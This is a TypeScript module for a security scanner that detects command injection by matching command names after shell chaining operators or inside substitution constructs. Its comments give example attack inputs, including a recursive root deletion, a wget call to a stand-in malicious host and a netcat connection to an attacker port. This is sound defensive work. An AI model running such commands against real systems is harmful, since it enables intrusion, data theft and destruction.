// src/detection/command-injection.ts

/*
 * Bounded command-injection detector. Flags a known command/binary name only
 * when it appears immediately after a shell chaining operator or inside a
 * command-substitution construct — not merely co-occurring anywhere in the
 * value — since shell metacharacters (| & ; `) and these command names are
 * also common in ordinary prose, CSV-like delimited fields, and abbreviations
 * (e.g. "NC" as a US state, pipe-delimited tag lists).
 */

import type { Detector, DetectorContext, DetectionFinding } from './types.js';
import { adjustConfidenceForEvasion, confidenceBandFor } from './detector-utils.js';

const RULE_ID = 'input.command_injection_indicator';

// Kept to unambiguous binary/utility names. Deliberately excludes common
// English verbs (find, kill, ping, mail, echo) even though they are real
// commands too — those carry too much false-positive risk even with the
// positional check, and should only be added after monitor-mode telemetry
// review, per this repo's rollout guidance.
const COMMAND_WORDS = [
  'cat', 'curl', 'wget', 'bash', 'sh', 'zsh', 'nc', 'netcat',
  'python', 'perl', 'ruby', 'node', 'whoami', 'id', 'uname',
  'rm', 'chmod', 'chown', 'telnet', 'nslookup', 'reboot', 'shutdown', 'dd', 'mkfs',
  'powershell', 'pwsh', 'cmd.exe',
] as const;
const COMMAND_ALT = COMMAND_WORDS.join('|');

// Command word must immediately follow a chaining operator: "; rm -rf /",
// "a && wget evil.com", "x | nc attacker 4444". A bare "|" or "&" used as an
// application-level delimiter elsewhere in the value won't have a command
// name directly after it and so won't match.
const CHAIN_THEN_COMMAND = new RegExp(`(?:&&|\\|\\||[;&|])\\s*(?:${COMMAND_ALT})\\b`, 'iu');

// Command word must sit immediately inside the substitution construct:
// "$(whoami)", "` id `".
const SUBSTITUTION_THEN_COMMAND = new RegExp(`(?:\`|\\$\\()\\s*(?:${COMMAND_ALT})\\b`, 'iu');

function commandInjectionReason(value: string): string | undefined {
  if (SUBSTITUTION_THEN_COMMAND.test(value)) return 'command_substitution';
  if (CHAIN_THEN_COMMAND.test(value)) return 'shell_operator_chain';
  return undefined;
}

export const commandInjectionDetector: Detector = {
  ruleId: RULE_ID,
  detect(context: DetectorContext): readonly DetectionFinding[] {
    return context.values.flatMap((item) => {
      const reasonCode = commandInjectionReason(item.value);
      if (reasonCode === undefined) return [];
      const confidence = adjustConfidenceForEvasion(0.9, item);
      return [
        {
          ruleId: RULE_ID,
          category: 'input' as const,
          severity: 'critical' as const,
          confidence,
          confidenceBand: confidenceBandFor(confidence),
          component: item.component,
          path: item.path,
          reasonCode,
          evidenceId: `${RULE_ID}:${item.component}:${item.path}:${reasonCode}`,
        },
      ];
    });
  },
};